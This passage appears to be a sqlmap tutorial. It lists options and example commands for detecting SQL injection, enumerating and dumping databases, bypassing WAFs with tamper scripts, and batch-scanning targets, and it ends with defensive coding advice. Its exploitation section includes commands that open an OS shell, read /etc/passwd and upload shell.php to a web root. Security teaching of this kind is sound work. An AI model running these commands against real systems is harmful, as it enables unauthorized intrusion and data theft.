| `-u URL, --url=URL` | Target URL |
| `-d DIRECT` | Direct connection to the database |
| `-r REQUESTFILE` | Load HTTP request from a file |
| `-g GOOGLEDORK` | Process Google dork results as target URLs |
| `-p TESTPARAMETER` | Testable parameter(s) |
| `--data=DATA` | Data string to be sent through POST |
| `--cookie=COOKIE` | HTTP Cookie header value |
| `--user-agent=AGENT` | HTTP User-Agent header value |
| `--random-agent` | Use a random HTTP User-Agent header |
| `--proxy=PROXY` | Use a proxy to connect to the target URL |

### Getting Help

```bash
# Display basic help
python sqlmap.py -h

# Display advanced help
python sqlmap.py -hh
```

## Practical Examples

### Example 1: Basic URL Testing

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

This command tests the "id" parameter for SQL injection vulnerabilities and attempts to retrieve the list of databases if successful.

![SQLMap Basic URL Testing](/api/placeholder/800/450)

### Example 2: Testing with HTTP POST Data

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" -p username
```

This tests the "username" parameter in the POST data for SQL injection vulnerabilities.

### Example 3: Testing with Cookies

```bash
sqlmap -u "http://example.com/member.php" --cookie="PHPSESSID=1234567890abcdef" --level=3
```

This tests the cookies for SQL injection vulnerabilities with a higher level of detection.

### Example 4: Database Enumeration

Once a vulnerability is found, you can enumerate the database structure:

```bash
# List databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# List tables in a specific database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# List columns in a specific table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns

# Dump data from a specific table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump
```

    B --> C[Enumerate Tables]
    C --> D[Enumerate Columns]
    D --> E[Extract Data]
    E --> F[Advanced Exploitation]
```

### Example 5: Advanced Exploitation

SQLMap can also be used for more advanced exploitation:

```bash
# Execute OS commands
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# Access the file system
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Upload files
sqlmap -u "http://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

## Advanced SQLMap Techniques

### Bypassing WAF/IPS

Web Application Firewalls (WAF) and Intrusion Prevention Systems (IPS) can sometimes block SQLMap's attacks. Here are some techniques to bypass them:

```bash
# Using a tamper script
sqlmap -u "http://example.com/page.php?id=1" --tamper=between,space2comment,randomcase

# Using a random User-Agent
sqlmap -u "http://example.com/page.php?id=1" --random-agent

# Using a delay between requests
sqlmap -u "http://example.com/page.php?id=1" --delay=2

# Using a different technique
sqlmap -u "http://example.com/page.php?id=1" --technique=T
```

::: {.callout-tip}
SQLMap includes dozens of tamper scripts that can help bypass WAF/IPS protections. You can list them using `sqlmap --list-tampers`.
:::

### Using SQLMap with Burp Suite

SQLMap can be integrated with Burp Suite for more comprehensive testing:

1. Capture the request in Burp Suite
2. Save the request to a file
3. Use SQLMap's `-r` option to test the request

```bash
sqlmap -r request.txt --dbs
```

![SQLMap with Burp Suite](/api/placeholder/800/450)

### Batch Processing

For testing multiple targets, SQLMap offers batch processing capabilities:

```bash
# Create a list of targets
echo "http://example1.com/page.php?id=1" > targets.txt
echo "http://example2.com/page.php?id=1" >> targets.txt

# Test all targets
sqlmap -m targets.txt --dbs --batch
```

## SQLMap Configuration

SQLMap can be customized through a configuration file (`sqlmap.conf`) or through command-line options.

### Example Configuration File

```ini
[Target]
url = http://example.com/page.php?id=1
data = 
cookie = 

[Request]
delay = 0
timeout = 30
retries = 3
randomize-user-agent = True

[Injection]
technique = BEUSTQ
threads = 5
level = 1
risk = 1

[Detection]
string-match = 
not-string-match = 
```

### Performance Tuning

To improve SQLMap's performance:

```bash
# Use multiple threads
sqlmap -u "http://example.com/page.php?id=1" --threads=5

# Specify the injection technique
sqlmap -u "http://example.com/page.php?id=1" --technique=BEU

# Use faster time delays for blind injection
sqlmap -u "http://example.com/page.php?id=1" --time-sec=1
```

## Defensive Measures Against SQL Injection

Understanding SQLMap helps in implementing proper defenses against SQL injection:

### Prevention Techniques

1. **Use Parameterized Queries**

```python
# Unsafe
query = "SELECT * FROM users WHERE username = '" + username + "'"

# Safe (parameterized)
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

2. **Implement Input Validation**

```python
# Validate input type
if not isinstance(user_id, int):
    raise ValueError("User ID must be an integer")

# Validate input format
if not re.match(r'^\w+$', username):
    raise ValueError("Username contains invalid characters")
```

3. **Use ORM (Object-Relational Mapping)**

```python
# Using SQLAlchemy (Python ORM)
user = session.query(User).filter(User.username == username).first()
```

4. **Apply the Principle of Least Privilege**

```sql
-- Create limited-privilege database user
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT ON app_db.* TO 'app_user'@'localhost';
```

5. **Implement WAF Protection**

Configure your WAF to detect and block SQL injection attempts, including those from SQLMap.
